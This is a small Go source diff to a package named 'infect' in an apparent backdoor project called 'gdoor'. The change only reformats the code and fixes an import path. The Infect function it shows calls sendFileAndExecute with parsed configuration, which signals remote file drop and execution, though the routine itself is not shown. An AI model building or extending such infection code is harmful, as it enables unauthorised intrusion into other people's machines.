@@ -1,9 +1,9 @@
 package infect
 
-import(
-  "../info"
+import (
+	"gdoor/info"
 )
 
-func Infect(i *info.Info){
-  sendFileAndExecute(i, parseConfig(i))
+func Infect(i *info.Info) {
+	sendFileAndExecute(i, parseConfig(i))
 }
